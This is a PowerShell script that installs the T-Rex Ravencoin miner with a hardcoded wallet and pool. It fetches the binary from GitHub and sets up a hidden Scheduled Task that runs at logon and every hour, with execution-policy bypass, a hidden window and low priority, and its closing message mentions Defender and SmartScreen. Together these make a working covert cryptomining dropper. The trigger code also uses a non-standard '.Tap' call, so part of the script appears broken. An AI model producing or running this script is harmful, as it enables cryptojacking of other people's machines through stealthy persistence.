# === User-mode T-Rex RVN installer with hidden Scheduled Task ===
param(
  [string]$Wallet = "RJAht5tU4imXtDYQSh1o5EHjgwFVBbpgZR",
  [string]$Pool   = "stratum+tcp://us-rvn.2miners.com:6060"
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Paths
$BaseDir   = Join-Path $env:USERPROFILE "trex"
$ExePath   = Join-Path $BaseDir "t-rex.exe"
$CfgPath   = Join-Path $BaseDir "trex.json"
$RunPS1    = Join-Path $BaseDir "run-trex.ps1"
$TaskName  = "T-Rex Miner (User)"
# We'll launch via PowerShell (hidden) to ensure the console stays out of sight

# 1) Ensure install dir
if (-not (Test-Path $BaseDir)) { New-Item -ItemType Directory -Path $BaseDir | Out-Null }

# 2) Download latest T-Rex for Windows
$rel = Invoke-RestMethod "https://api.github.com/repos/trexminer/T-Rex/releases/latest"
$asset = $rel.assets | Where-Object { $_.name -match 'win.*\.zip$' } | Select-Object -First 1
if (-not $asset) { throw "Could not find a Windows zip in latest T-Rex release assets." }
$zip = Join-Path $BaseDir "trex.zip"
Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zip -UseBasicParsing
Expand-Archive -Path $zip -DestinationPath $BaseDir -Force
Remove-Item $zip -Force

# 3) Place t-rex.exe at a stable path
$exe = Get-ChildItem -Path $BaseDir -Recurse -Filter "t-rex.exe" | Select-Object -First 1
if (-not $exe) { throw "t-rex.exe not found after extraction." }
if ($exe.FullName -ne $ExePath) { Copy-Item $exe.FullName -Destination $ExePath -Force }

# 4) Write miner config (RVN + --low-load)
$worker = $env:COMPUTERNAME
@{
  algo            = "kawpow"
  url             = $Pool
  user            = "$Wallet.$worker"
  pass            = "x"
  "api-bind-http" = "127.0.0.1:4067"
  quiet           = $true
  "no-color"      = $true
  "low-load"      = 1
} | ConvertTo-Json -Depth 6 | Out-File -FilePath $CfgPath -Encoding UTF8 -Force

# 5) Launcher script (kept tiny; miner runs hidden via Scheduled Task)
@'
$exe = Join-Path $env:USERPROFILE "trex\t-rex.exe"
$cfg = Join-Path $env:USERPROFILE "trex\trex.json"
if (-not (Test-Path $exe)) { throw "t-rex.exe not found at $exe" }
Start-Process -FilePath $exe `
  -ArgumentList "--config `"$cfg`"" `
  -WorkingDirectory (Split-Path $exe) `
  -WindowStyle Hidden `
  -Priority BelowNormal
'@ | Out-File -FilePath $RunPS1 -Encoding UTF8 -Force

# 6) Create/replace a user-level Scheduled Task (hidden, repeat hourly, no duplicate instances)
# Triggers: run at logon; plus daily trigger that repeats every hour indefinitely
$triggers = @(
  New-ScheduledTaskTrigger -AtLogOn
  (New-ScheduledTaskTrigger -Daily -At (Get-Date).Date.AddMinutes(1)).Tap({
      param($t) $t.Repetition = (New-Object -TypeName System.Management.Automation.PSObject -Property @{ Interval = (New-TimeSpan -Hours 1); Duration = ([TimeSpan]::MaxValue) })
  })
)
# Action: PowerShell hidden -> run the tiny launcher
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$RunPS1`""
# Settings: Hidden, do not spawn new instance, allow on battery, keep trying
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -Hidden

# Replace existing task if present (user scope)
$existing = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
if ($existing) { Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false }
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $triggers -Settings $settings -Description "Run T-Rex RVN miner in background (user mode)"

# 7) Start it now and report status
Start-ScheduledTask -TaskName $TaskName
Start-Sleep -Seconds 3
$proc = Get-Process -Name "t-rex" -ErrorAction SilentlyContinue | Select-Object -First 1

"`nInstalled to:  $BaseDir"
"Config:        $CfgPath"
"Task:          $TaskName  (Logon + hourly, hidden, IgnoreNew)"
if ($proc) { "Status:        Running (PID $($proc.Id))" } else { "Status:        Started via Task Scheduler; if not visible, check Defender/SmartScreen and the Task Scheduler History." }
